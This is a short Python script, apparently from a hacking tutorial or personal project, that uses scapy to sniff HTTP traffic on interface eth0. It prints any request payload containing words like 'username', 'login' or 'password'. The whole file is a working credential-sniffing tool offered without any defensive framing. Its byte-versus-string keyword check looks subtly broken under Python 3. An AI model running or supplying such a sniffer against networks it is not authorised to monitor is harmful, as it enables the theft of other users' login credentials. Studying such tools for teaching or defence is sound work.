import scapy.all as scapy
from scapy.layers import http

def packetSniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "login", "user", "password"]
            for key in keywords:
                if key in load:
                    print(load)
                    break

packetSniffer("eth0")